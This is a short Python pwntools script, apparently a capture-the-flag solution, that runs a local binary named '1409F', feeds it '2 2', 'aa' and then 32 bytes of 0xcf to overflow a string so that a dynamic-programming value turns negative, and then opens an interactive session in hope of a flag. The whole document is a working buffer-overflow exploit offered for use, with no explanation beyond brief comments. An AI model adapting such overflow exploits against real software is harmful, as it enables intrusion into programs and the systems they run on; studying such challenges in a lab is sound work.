from pwn import *

#init

e = ELF('./1409F')

p = process(e.path)

#exploit

#overflow string t to make dp[0][0] have negative value

p.sendline('2 2')
p.sendline('aa')
p.sendline(p8(0xcf) * 0x20)

#pray for flag

p.interactive()
